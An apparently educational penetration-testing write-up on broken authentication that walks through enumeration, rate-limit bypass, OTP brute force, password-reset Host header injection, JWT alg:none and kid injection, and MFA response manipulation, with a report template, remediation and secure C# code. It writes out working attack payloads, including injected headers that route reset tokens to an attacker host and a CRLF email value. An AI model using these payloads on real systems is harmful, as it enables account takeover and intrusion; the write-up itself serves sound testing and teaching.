# Broken Authentication & Session Management — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Authentication Failures — OWASP A07:2021
>
> **Severity:** Critical — Direct path to Account Takeover (ATO), privilege escalation, and full application compromise
>
> **Real-world impact:** Authentication flaws have been present in a significant portion of enterprise engagements I've conducted. They consistently rank among the highest-severity findings because the blast radius is enormous — one broken auth bug can compromise every user on the platform.

---

## 🧠 Why This Write-Up Exists

Authentication is the single most critical security control in any application. It is the boundary between "anonymous visitor" and "trusted user." When it fails, everything behind it fails too.

In enterprise environments, authentication bugs are rarely obvious. They don't usually look like `admin:admin` on a login form. They look like a password reset flow that was built by a different team three years later, an MFA bypass hidden in a mobile API endpoint the main team forgot existed, or an SSO misconfiguration introduced when the company acquired a subsidiary.

These are the authentication bugs I find in real engagements — and how I find them.

---

## 📖 What Is Broken Authentication?

Broken Authentication covers any weakness in how an application verifies **who a user is** and **maintains that verified identity across a session**. It includes flaws in:

- Login mechanisms (brute force, credential stuffing, enumeration)
- Password reset and account recovery flows
- Session token generation and lifecycle management
- Multi-factor authentication (MFA/OTP) implementation
- JWT and token-based authentication
- OAuth and SSO integrations
- Logout and session invalidation

```
The authentication attack surface in a modern enterprise application:

  [Login Form]         → Credential stuffing, brute force, user enumeration
  [Password Reset]     → Token brute force, host header injection, token reuse
  [OTP / MFA]          → OTP bypass, response manipulation, backup code abuse
  [Session Cookie]     → Fixation, insecure flags, no regeneration post-login
  [JWT / Bearer Token] → alg:none, weak secret, kid injection, token reuse
  [OAuth / SSO]        → State parameter bypass, redirect_uri manipulation
  [Remember Me]        → Predictable tokens, persistent session abuse
  [Logout]             → Session not invalidated server-side
  [Mobile / API]       → Separate auth endpoints often skipped in security reviews
```

---

## 🔍 Phase 1 — Reconnaissance: Mapping the Auth Surface

Before testing any payload, I spend time fully mapping every authentication-related endpoint in the application. This is the step most testers rush — and where the best findings hide.

### What to Map in Burp Suite

1. Open the application, use every auth feature as a real user
2. Go to **Proxy → HTTP History**, filter for auth-related paths
3. Look for patterns: `/login`, `/auth`, `/token`, `/session`, `/reset`, `/verify`, `/otp`, `/mfa`, `/oauth`, `/sso`, `/logout`, `/refresh`

### The Questions to Answer Before Testing

| Question | Why It Matters |
|---|---|
| Are there multiple login endpoints? (web, mobile API, admin panel) | Mobile APIs often have weaker rate limiting |
| Is MFA enforced uniformly or only on certain flows? | MFA bypass often lives in a forgotten endpoint |
| Is session managed via cookie or bearer token? | Different attack surface for each |
| Does the application use JWTs? | Entire JWT attack class opens up |
| Is there SSO / OAuth integration? | State bypass, open redirect, token leakage |
| Is the password reset flow in-house or third-party? | Third-party resets often have different security posture |
| Does the mobile app use the same API? | Frequently has no WAF, no rate limiting |

---

## 💥 Phase 2 — Attack Vectors

### Vector 1 — Username / Account Enumeration

Before attempting any credential attack, establish whether the application reveals valid usernames. This is often treated as low severity — it is not. It is the prerequisite for every subsequent attack.

**Test the login response difference:**

```
POST /login
username=validuser@company.com  → "Incorrect password"
username=nobody@fake.com        → "Account not found"

↑ Different responses = username enumeration confirmed
```

**Test the password reset response difference:**

```
POST /forgot-password
email=real@company.com    → "Reset link sent to your email"
email=fake@nowhere.com    → "Email address not found"

↑ Same issue — confirms valid email addresses
```

**Test account lockout messages:**

```
After 5 wrong attempts:
valid@company.com    → "Account locked for 15 minutes"
fake@nobody.com      → "Invalid credentials"

↑ Lockout message itself confirms the account exists
```

**In Burp Suite:** Send both requests to Comparer. Even a single character difference in response body or a difference in response time (database lookup vs no lookup) confirms enumeration.

> **Enterprise context:** In one engagement, the password reset page returned "We've sent a reset link" for valid emails and "That email is not registered" for invalid ones. Combined with a company directory leak via LinkedIn, this gave me a list of 200 valid employee credentials to target in the next phase.

---

### Vector 2 — Brute Force & Rate Limiting Bypass

Modern enterprise apps often implement rate limiting — but inconsistently. The limits on the main web login may not exist on the mobile API, the admin panel, or the password reset endpoint.

**Test for rate limiting on every auth endpoint separately:**

```
Endpoints to test individually:
POST /api/v1/auth/login          ← main login
POST /api/mobile/v2/login        ← mobile endpoint
POST /admin/login                ← admin panel
POST /api/auth/verify-otp        ← MFA endpoint
POST /api/account/reset-password ← password reset
POST /api/auth/refresh           ← token refresh
```

**Header-based IP bypass (test after a lockout triggers):**

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.1
X-Remote-IP: 1.2.3.4
X-Client-IP: 172.16.0.1
True-Client-IP: 10.10.10.10
CF-Connecting-IP: 8.8.8.8
```

**Burp Suite Intruder setup for rate limit bypass:**

```
1. Capture login POST request
2. Send to Intruder → Pitchfork attack
3. Position 1: password field
4. Position 2: X-Forwarded-For header value
5. Payload 1: common password list
6. Payload 2: incrementing IP list (1.1.1.1, 1.1.1.2...)
7. Each attempt comes from a "different IP" — bypasses IP-based lockout
```

**OTP / 2FA Brute Force:**

```
4-digit OTP = 10,000 combinations
6-digit OTP = 1,000,000 combinations

If no rate limiting:
- 4-digit: brute forceable in minutes via Burp Intruder
- 6-digit: brute forceable with automation in hours

Burp Intruder → Sniper attack on OTP field
Payload: Numbers → 000000 to 999999
Watch for: status code change OR response body change (success message)
```

> **Enterprise context:** I found a 4-digit OTP bypass on a financial services internal application. The `/api/v2/mobile/verify-otp` endpoint had no rate limiting, while the web endpoint had a 5-attempt lockout. The mobile endpoint was added 18 months after the web app and the security requirement was never applied to it.

---

### Vector 3 — Password Reset Flow Attacks

The password reset flow is consistently one of the richest attack surfaces in enterprise applications. It is usually built separately from the main authentication module, often by a different developer, and rarely receives the same security review.

**Test 1 — Token Length and Entropy**

```
Request a password reset and observe the token in the link:
https://app.company.com/reset?token=Ab3kP   ← 5 chars = brute forceable
https://app.company.com/reset?token=4729    ← numeric only = very weak

Strong tokens look like:
?token=a8f5f167f44f4964e6c998dee827110c (32+ hex chars)

In Burp: Send /reset?token=FUZZ to Intruder
Payload: Brute forcer (a-z, A-Z, 0-9), length matching observed token
If 200 response with password change form = valid token found
```

**Test 2 — Token Expiry and Reuse**

```
Step 1: Request a password reset → get token in email
Step 2: Do NOT use it
Step 3: Request another reset → get a second token
Step 4: Go back and use the FIRST token — does it still work?

If yes: tokens are never invalidated = vulnerability

Also test: Use token → reset password → try same token again
If token still works = single-use enforcement missing
```

**Test 3 — Host Header Injection**

This is one of the most impactful findings I have demonstrated in enterprise engagements. The application generates the reset link using the Host header value — if that value is injectable, the reset link is sent to the attacker's server.

```
Capture the POST /forgot-password request in Burp Suite

Original request:
POST /forgot-password HTTP/1.1
Host: app.company.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com

Modified request — inject attacker-controlled host:
POST /forgot-password HTTP/1.1
Host: attacker-burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@company.com

OR use:
Host: app.company.com
X-Forwarded-Host: attacker.burpcollaborator.net

Check Burp Collaborator for incoming HTTP request containing the reset token.
If token arrives at Collaborator = Critical Account Takeover
```

**Test 4 — Parameter Pollution**

```
POST /forgot-password
email=attacker@evil.com&email=victim@company.com

OR:
email=victim@company.com%0d%0aCc:attacker@evil.com

Goal: Reset link goes to attacker while the victim's account is targeted
```

> **Enterprise context:** I demonstrated a Host Header Injection finding on an internal HR portal during an engagement. The application used `$_SERVER['HTTP_HOST']` directly in PHP to construct the reset URL. By injecting `X-Forwarded-Host`, I received the reset token for the HR admin account in Burp Collaborator within seconds of sending the request.

---

### Vector 4 — Session Management Flaws

**Test 1 — Session Fixation**

```
Step 1: Visit the login page BEFORE logging in
Step 2: Note the session cookie value (e.g. PHPSESSID=abc123)
Step 3: Log in with valid credentials
Step 4: Check the session cookie value again

If the value is IDENTICAL before and after login = Session Fixation

Exploitation:
- Attacker pre-sets a known session ID via URL parameter or social engineering
- Victim authenticates — session ID remains the same
- Attacker uses the known session ID to access the authenticated session
```

**Test 2 — Cookie Security Flags**

```
In Burp Suite — Proxy → HTTP History → find Set-Cookie header after login

Check for:
Set-Cookie: session=eyJhbG...; HttpOnly; Secure; SameSite=Strict

Missing HttpOnly  → JavaScript can steal the cookie (XSS → ATO chain)
Missing Secure    → Cookie transmitted over HTTP — interception possible
Missing SameSite  → CSRF attacks possible
Domain too broad  → Cookie=.company.com sends to ALL subdomains
```

**Test 3 — Session Invalidation After Logout**

```
Step 1: Log in — capture session token value
Step 2: Log out via the application
Step 3: Manually replay a request with the old session token
         (Burp Repeater → paste old cookie → send authenticated request)

If the server accepts the old token = Session not invalidated server-side

This is extremely common in stateless JWT applications where
"logout" just deletes the client-side token but the JWT remains valid
until its exp claim expires (often 24 hours or more).
```

**Test 4 — Session Token Predictability**

```
Request 10 session tokens in sequence (10 fresh logins or registrations)
Compare tokens for patterns:
- Sequential IDs: sess_1001, sess_1002...  ← predictable
- Timestamp-based: 1714823400-username     ← predictable
- Short tokens: 6-8 chars                  ← brute forceable
- Base64 decoded reveals plaintext user data ← information disclosure

Strong session tokens are cryptographically random, min 128 bits,
and reveal nothing about the user or server state when decoded.
```

---

### Vector 5 — JWT Vulnerabilities

JWTs are widely used in enterprise APIs and microservices. Weak implementations are common because developers often treat the Base64-encoded token as if it provides integrity without understanding that the signature must be verified.

**Step 1 — Decode and analyse the token**

```
A JWT has three parts separated by dots:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header (Base64)
.eyJ1c2VyIjoiZGhlZXJhaiIsInJvbGUiOiJ1c2VyIn0  ← Payload (Base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature

Decode Header:  {"alg":"HS256","typ":"JWT"}
Decode Payload: {"user":"dheeraj","role":"user","exp":1714909200}

In Burp Suite: Decoder tab → paste each segment → Base64 decode
Or use: jwt.io → paste full token → decoded automatically
```

**Attack 1 — Algorithm None (alg:none)**

```
Goal: Remove the signature requirement entirely

1. Decode the header
2. Change "alg":"HS256" to "alg":"none"
3. Modify payload — change "role":"user" to "role":"admin"
4. Re-encode header and payload in Base64 (URL-safe, no padding)
5. Construct token with empty signature:
   new_header.new_payload.   ← trailing dot, empty signature

Send modified token in Authorization header.
If server accepts = Critical — no signature verification
```

**Attack 2 — Weak Secret Brute Force**

```
If alg is HS256 (HMAC), the secret key may be weak and crackable.

Using hashcat:
hashcat -a 0 -m 16500 <full_jwt_token> /usr/share/wordlists/rockyou.txt

If cracked: you can now sign any payload with the real secret key.
Forge: {"role":"admin","user":"anyuser"} with the cracked secret.
Full administrative access.

Common weak secrets found in enterprise apps:
"secret", "password", "changeme", "jwt_secret", app name, company name
```

**Attack 3 — kid (Key ID) Header Injection**

```
If the JWT header contains "kid" parameter:
{"alg":"HS256","typ":"JWT","kid":"keys/signing.key"}

The server uses the kid value to look up the signing key.
This value may be injectable.

SQL Injection via kid:
{"kid":"' UNION SELECT 'attacker_secret'--"}
→ Server signs/verifies with 'attacker_secret' — you control the key

Directory Traversal via kid:
{"kid":"../../../../dev/null"}
→ Server reads /dev/null as key = empty string = sign with empty string
→ Forge token signed with empty string signature
```

**Attack 4 — Token Replay and Missing Expiry**

```
1. Capture a valid JWT after login
2. Log out
3. Replay the JWT in a new request

If accepted = no server-side invalidation (common in stateless JWT setups)

Also check:
- Does the "exp" claim exist? If missing = token never expires
- Is the "exp" value far in the future? (e.g. year 2099 = effectively no expiry)
- Decode payload, look for exp field, convert Unix timestamp to human-readable date
```

---

### Vector 6 — MFA / OTP Bypass Techniques

Enterprise applications frequently implement MFA but with logic flaws that allow bypassing the second factor entirely.

**Bypass 1 — Response Manipulation**

```
Step 1: Enter valid username and password
Step 2: MFA prompt appears — enter a WRONG OTP code
Step 3: Intercept the response in Burp Suite
Step 4: Change the response:
        {"status":"failed","mfa_verified":false}
   →    {"status":"success","mfa_verified":true}
Step 5: Forward the modified response

If the application trusts the response value and redirects to dashboard
= MFA is client-side validated only = Critical bypass
```

**Bypass 2 — Direct Endpoint Access**

```
After entering valid credentials (step 1 of MFA flow):
Instead of completing MFA, directly navigate to:
https://app.company.com/dashboard
https://app.company.com/api/profile
https://app.company.com/account/settings

If accessible = MFA enforcement missing on protected resources
The application authenticates at step 1 but enforces MFA only
at the redirect, not at the resource level.
```

**Bypass 3 — Backup Code Abuse**

```
Most MFA implementations provide backup codes.
Test:
1. Are backup codes single-use? (use same code twice)
2. Are backup codes rate-limited? (brute force 8-digit codes)
3. Can backup codes be regenerated without MFA verification?
4. Are backup codes stored in plaintext? (check profile API response)
```

**Bypass 4 — OTP Validity Window Abuse**

```
TOTP codes are typically valid for 30 seconds.
Some implementations accept codes from wider windows (±90 seconds, ±5 minutes)
or never expire used codes.

Test: Use the same OTP code twice in rapid succession.
If accepted both times = no single-use enforcement = replay attack possible.
```

> **Enterprise context:** I found a response manipulation MFA bypass in an enterprise internal tool used by 3,000 employees. The application performed MFA verification on the frontend via JavaScript but the backend API accepted any request with a valid session cookie from step 1, regardless of MFA completion. A standard Burp proxy intercept, changing `"mfa_passed": false` to `"mfa_passed": true` in the response, bypassed it completely.

---

## 🗂️ Phase 3 — Systematic Testing Checklist

Run through this against every authentication flow in scope.

```
LOGIN ENDPOINT
☐ Username enumeration — different responses for valid vs invalid user?
☐ Rate limiting — 50 attempts without lockout?
☐ Header-based IP bypass — X-Forwarded-For bypass lockout?
☐ Mobile API endpoint — same rate limiting as web?
☐ Admin panel — separate login with weaker controls?
☐ Account lockout message reveals valid usernames?

PASSWORD RESET
☐ Reset token entropy — short, predictable, or numeric only?
☐ Token expiry — still valid after 24+ hours?
☐ Token reuse — same token works multiple times?
☐ Previous token — still valid after new token requested?
☐ Host header injection — X-Forwarded-Host sends token to attacker?
☐ Parameter pollution — email=victim&email=attacker?
☐ Response difference — valid vs invalid email revealed?

SESSION MANAGEMENT
☐ Session fixation — token same before and after login?
☐ HttpOnly flag — missing on session cookie?
☐ Secure flag — missing (transmitted over HTTP)?
☐ SameSite — missing (CSRF possible)?
☐ Session invalidation — old token works after logout?
☐ Token predictability — sequential, timestamp-based, or short?

JWT / TOKENS
☐ Algorithm none attack — alg:none accepted?
☐ Weak secret — hashcat against rockyou.txt?
☐ kid injection — SQL injection or path traversal in kid param?
☐ Missing exp claim — token never expires?
☐ Payload tampering — role/privilege fields modifiable?
☐ Token reuse post-logout — replayed token accepted?

MFA / OTP
☐ Response manipulation — frontend-only MFA check?
☐ Direct endpoint access — skip MFA by navigating directly?
☐ OTP rate limiting — 4/6 digit brute force possible?
☐ OTP reuse — same code valid twice?
☐ Backup codes — brute forceable or reusable?
☐ MFA on all endpoints — mobile API also enforced?
```

---

## 📋 Enterprise Pentest Report Template

---

**Finding Title:** Authentication Bypass via MFA Response Manipulation

**Severity:** Critical

**CVSS v3.1 Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Affected Endpoint:** `POST /api/auth/verify-mfa`

**Authentication Required:** Partial — valid username and password required (step 1 of 2)

---

**Vulnerability Description:**

The application's MFA verification is enforced at the frontend layer only. After successful password authentication, the server issues a session token with partial trust. The MFA verification step sends the OTP to `/api/auth/verify-mfa`, and the server responds with `{"mfa_verified": false}` on failure. By intercepting and modifying this response to `{"mfa_verified": true}`, an attacker bypasses MFA entirely and gains full authenticated access.

The root cause is that MFA state is trusted from the client response rather than being tracked and enforced server-side.

---

**Steps to Reproduce:**

1. Open Burp Suite and enable Proxy intercept
2. Navigate to the application login page
3. Enter valid credentials (username and password) and submit
4. When the MFA prompt appears, enter an incorrect OTP code
5. In Burp Suite, intercept the server response to `/api/auth/verify-mfa`
6. Modify the response body from `{"status":"error","mfa_verified":false}` to `{"status":"success","mfa_verified":true}`
7. Forward the modified response
8. Observe: application redirects to authenticated dashboard, bypassing MFA entirely

---

**Proof of Concept:**

```
Original server response (intercepted):
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"error","mfa_verified":false,"message":"Invalid OTP"}

Modified response (attacker-controlled):
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"success","mfa_verified":true,"redirect":"/dashboard"}

Result: Full authenticated session granted without valid OTP
```

---

**Business Impact:**

- Complete bypass of second-factor authentication for all user accounts
- Any attacker with a compromised password (via phishing, credential stuffing, or data breach) can fully access accounts regardless of MFA enforcement
- Renders the organisation's MFA investment ineffective as a security control
- Particularly severe given the application handles [HR data / financial records / customer PII]

---

**Remediation:**

| Priority | Action |
|---|---|
| Immediate | Move MFA state tracking server-side — never trust client response for auth decisions |
| Immediate | Validate MFA completion in session middleware before serving protected resources |
| Short-term | Implement rate limiting on `/api/auth/verify-mfa` (max 5 attempts, then lockout) |
| Short-term | Enforce MFA on all API endpoints, not just the redirect flow |
| Long-term | Conduct authentication architecture review — ensure all auth controls are enforced at the resource level |

---

**Secure Implementation Pattern (C# / ASP.NET):**

```csharp
// ❌ VULNERABLE — trusting client-side MFA result
public IActionResult VerifyMfa([FromBody] MfaRequest request)
{
    bool isValid = _otpService.Verify(request.Code);
    return Ok(new { mfa_verified = isValid }); // ← client decides what to do with this
}

// ✅ SECURE — server enforces MFA state in session
public IActionResult VerifyMfa([FromBody] MfaRequest request)
{
    bool isValid = _otpService.Verify(request.Code);
    if (!isValid)
        return Unauthorized(new { message = "Invalid OTP" });

    // Only set MFA as complete in server-side session on valid OTP
    HttpContext.Session.SetString("mfa_verified", "true");
    return Ok(new { redirect = "/dashboard" });
}

// ✅ SECURE — middleware checks MFA completion before every protected route
public class MfaRequiredMiddleware
{
    public async Task InvokeAsync(HttpContext context)
    {
        var mfaVerified = context.Session.GetString("mfa_verified");
        if (mfaVerified != "true")
        {
            context.Response.StatusCode = 401;
            return;
        }
        await _next(context);
    }
}
```

---

## 🧪 Practice Labs

| Platform | Resource | Focus Area |
|---|---|---|
| [PortSwigger Web Security Academy](https://portswigger.net/web-security/authentication) | 14 free authentication labs | Brute force, MFA bypass, password reset |
| [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt) | 8 dedicated JWT labs | alg:none, weak secrets, kid injection |
| [HackTheBox](https://hackthebox.com) | Authentication-focused machines | Real-world scenarios |
| [PentesterLab](https://pentesterlab.com) | JWT and OAuth exercises | Token-based auth |
| [DVWA](https://github.com/digininja/DVWA) | Brute force module | Safe local testing |

---

## 🧭 Key Takeaways From 5+ Years of Enterprise Testing

**1. Consistency gaps are where auth bugs live.**
Enterprise applications grow over years with different teams building different features. The main web login may be hardened. The mobile API endpoint added in year 3 often is not. Test every auth endpoint in the application — they do not all share the same controls.

**2. Logic flaws beat technical exploits.**
The most impactful authentication findings are not technical exploits like JWT algorithm confusion — they are logic flaws: MFA that is only checked at the redirect and not at the resource, password reset tokens that are never invalidated, session tokens that survive logout. These require thinking, not tools.

**3. Response manipulation is underrated.**
Many enterprise developers implement MFA and access control checks client-side for performance reasons, then trust the result. Every authentication decision that involves a server response being acted upon client-side is potentially bypassable. Always intercept and modify auth responses.

**4. Test the full lifecycle, not just the login.**
Login gets all the attention. The reset flow, MFA backup codes, remember-me token, and logout invalidation are almost never tested with the same rigour. In every engagement, I test the complete authentication lifecycle — from registration to permanent session termination.

**5. Report the chain, not just the finding.**
A username enumeration finding is low severity in isolation. Username enumeration + no rate limiting + weak password policy = account takeover chain. Always think about what an attacker can do with what you find, and document the chain. That is what changes the risk conversation with the client.

---

## 🔗 References

- [OWASP Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger Authentication Research](https://portswigger.net/web-security/authentication)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PayloadsAllTheThings — Authentication Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass)

---

<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
